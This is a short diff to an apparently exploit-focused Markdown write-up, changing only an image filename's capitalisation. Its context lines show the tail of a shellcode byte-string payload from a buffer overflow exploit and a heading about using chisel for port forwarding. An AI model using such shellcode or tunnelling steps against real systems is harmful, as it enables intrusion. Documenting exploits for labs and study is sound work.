@@ -558,7 +558,7 @@ payload += b"\x80\x31\xcb\x0b\xc8\x79\x1f\x58\x3c\xa1\x72\xc5"
 payload += b"\x1c\xc2\xe1\x61\x73\x61\x82\x0c\x8b"
 
 ```
-![image](https://raw.githubusercontent.com/kookiecrack/images/main/buffer-buff.png)
+![image](https://raw.githubusercontent.com/kookiecrack/images/main/Buffer-buff.png)
 
 * Use chisel for port forwarding
 ```
